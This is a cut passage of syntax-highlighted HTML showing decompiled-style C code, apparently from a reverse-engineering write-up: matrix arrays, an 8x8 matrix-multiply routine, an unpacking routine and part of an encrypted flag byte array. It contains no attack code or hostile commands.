number\">0x00000001</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">int</span> inv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">Enc3</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>a1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>a2<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>a3<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> result<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span>\n    <span class=\"token keyword\">int</span> k<span class=\"token punctuation\">;</span>      <span class=\"token comment\">// [esp+D0h] [ebp-20h]</span>\n    <span class=\"token keyword\">int</span> j<span class=\"token punctuation\">;</span>      <span class=\"token comment\">// [esp+DCh] [ebp-14h]</span>\n    <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>      <span class=\"token comment\">// [esp+E8h] [ebp-8h]</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>j<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            a3<span class=\"token punctuation\">[</span><span class=\"token number\">32</span> <span class=\"token operator\">*</span> i <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>k <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> k <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>k<span class=\"token punctuation\">)</span>\n                a3<span class=\"token punctuation\">[</span><span class=\"token number\">32</span> <span class=\"token operator\">*</span> i <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> j<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token operator\">*</span><span class=\"token operator\">&amp;</span>a2<span class=\"token punctuation\">[</span><span class=\"token number\">32</span> <span class=\"token operator\">*</span> k <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> j<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span> <span class=\"token operator\">*</span> i <span class=\"token operator\">+</span> k<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        result <span class=\"token operator\">=</span> i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">Dec2</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>a1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>a2<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> j<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span>\n\n    v4 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>j<span class=\"token punctuation\">)</span>\n            a2<span class=\"token punctuation\">[</span>v4<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">32</span> <span class=\"token operator\">*</span> i <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> EncFlag<span class=\"token punctuation\">[</span><span class=\"token number\">256</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x49</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x7C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x7D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x53</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x33</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x07</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x67</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x53</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x96</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x58</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x9E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x9E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x98</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x9E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0xC5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0xC6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0xCA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0xC1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x9E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x91</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x61</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x65</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token 